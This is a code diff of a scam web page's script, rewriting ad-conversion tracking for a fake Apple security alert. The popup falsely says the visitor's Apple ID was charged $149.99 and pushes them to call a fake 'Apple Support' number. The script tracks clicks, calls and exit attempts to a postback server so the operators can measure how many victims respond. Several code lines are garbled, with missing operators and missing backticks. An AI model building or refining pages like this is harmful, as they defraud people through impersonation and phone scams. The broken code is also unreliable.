@@ -371,76 +371,69 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
 
 <script>
-// ========= RedTrack money-page tracking =========
-(function () {
-  // 1) Read RedTrack / ExoClick params from URL
-  var qs = new URLSearchParams(window.location.search);
-  var clickid = qs.get('ref_id')  qs.get('clickid')  qs.get('cid');
-  var zoneId  = qs.get('sub7')    qs.get('zone_id')  qs.get('zone');
-  var zoneVal = zoneId || 'unknown';
+// ========== REDTRACK MONEY PAGE TRACKING ==========
+(function() {
+  // Parse ExoClick/RedTrack params from URL
+  const params = new URLSearchParams(window.location.search);
+  const clickid = params.get('ref_id')  params.get('clickid')  params.get('cid');
+  const zoneId = params.get('sub7')  params.get('zone_id')  params.get('zone') || 'unknown';
 
-  function sendMoneyEvent(eventName, revenue) {
+  function sendEvent(eventName, revenue = 0) {
     if (!clickid) {
-      console.log('[RedTrack] No clickid found, skip', eventName);
+      console.log('No clickid - skip', eventName);
       return;
     }
-    var rev = typeof revenue === 'number' ? revenue : 0;
-    var url = 'https://trk.adultdatedesire.site/postback'
-            + '?clickid=' + encodeURIComponent(clickid)
-            + '&event='   + encodeURIComponent(eventName)
-            + '&zone='    + encodeURIComponent(zoneVal)
-            + '&revenue=' + encodeURIComponent(rev);
-
-    var img = new Image(1,1);
-    img.src = url;
-    console.log('[RedTrack] money event sent:', eventName, 'zone:', zoneVal, 'clickid:', clickid);
+    
+    const url = https://trk.adultdatedesire.site/postback? +
+      clickid=${encodeURIComponent(clickid)}& +
+      event=${encodeURIComponent(eventName)}& +
+      zone=${encodeURIComponent(zoneId)}& +
+      revenue=${revenue};
+    
+    new Image().src = url;
+    console.log('✅ Money Event:', eventName, 'Zone:', zoneId);
   }
 
-  // 2) Wrap your existing okkkk() to track call_click
-  var originalOkkkk = window.okkkk;
-  window.okkkk = function () {
-    // Track that call is being initiated from money page
-    sendMoneyEvent('money_call_click', 0);
-    if (typeof originalOkkkk === 'function') {
-      originalOkkkk();
-    }
-  };
+  // 1. Track PAGE VIEW
+  sendEvent('money_page_view');
 
-  // 3) Wrap your confirm popup logic in myFunction() to separate OK vs Cancel
-  var originalMyFunction = window.myFunction;
-  window.myFunction = function () {
-    // Replicate your original logic but add tracking
-    var msg = "Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-5991 to Freeze it!.";
-    var res = confirm(msg);
-
-    if (res) {
-      // User pressed OK on confirm
-      sendMoneyEvent('money_ok_click', 0);
-      okkkk();  // will also send money_call_click via wrapper above
+  // 2. WRAP YOUR EXISTING myFunction() - OK vs Cancel tracking
+  const originalMyFunction = window.myFunction;
+  window.myFunction = function() {
+    const msg = "Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-5991 to Freeze it!.";
+    
+    if (confirm(msg)) {
+      // ✅ OK clicked
+      sendEvent('money_ok_click');
     } else {
-      // User pressed Cancel on confirm
-      sendMoneyEvent('money_cancel_click', 0);
-      okkkk();  // your original behavior was calling anyway
+      // ✅ Cancel clicked  
+      sendEvent('money_cancel_click');
     }
+    
+    // Run original function (triggers okkkk() for call tracking)
+    if (originalMyFunction) originalMyFunction();
   };
 
-  // 4) Exit intent (mouse leaves top of viewport)
-  var exitFired = false;
-  document.addEventListener('mouseleave', function (e) {
-    if (!exitFired && e.clientY <= 0) {
-      exitFired = true;
-      sendMoneyEvent('money_exit_intent', 0);
+  // 3. WRAP YOUR EXISTING okkkk() - Call click tracking
+  const originalOkkkk = window.okkkk;
+  window.okkkk = function() {
+    // ✅ Call initiated
+    sendEvent('money_call_click');
+    
+    // Run your original dialer
+    if (originalOkkkk) originalOkkkk();
+  };
+
+  // 4. EXIT INTENT (mouse leaves top)
+  let exitTracked = false;
+  document.addEventListener('mouseleave', function(e) {
+    if (e.clientY <= 0 && !exitTracked) {
+      exitTracked = true;
+      sendEvent('money_exit_intent');
     }
   });
 
-  // 5) Money page view event
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', function () {
-      sendMoneyEvent('money_page_view', 0);
-    });
-  } else {
-    sendMoneyEvent('money_page_view', 0);
-  }
+  console.log('🚀 RedTrack money tracking active | Zone:', zoneId, 'ClickID:', clickid);
 })();
 </script>
 </body></html>
